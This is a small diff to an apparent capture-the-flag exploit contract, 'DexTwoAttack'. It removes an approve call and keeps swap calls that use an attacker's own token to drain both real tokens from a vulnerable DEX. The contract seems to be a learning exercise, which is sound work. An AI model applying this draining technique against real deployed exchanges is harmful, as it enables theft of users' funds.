@@ -88,9 +88,6 @@ contract DexTwoAttack {
     address t1 = vulnContract.token1();
     address t2 = vulnContract.token2();
 
-    // approve dex to spend our tokens
-    vulnContract.approve(address(vulnContract), 100);
-
     // read comment in DexTwo.getSwapAmount() to understand
     vulnContract.swap(address(hackToken), t1, 1);
     vulnContract.swap(address(hackToken), t2, 1);
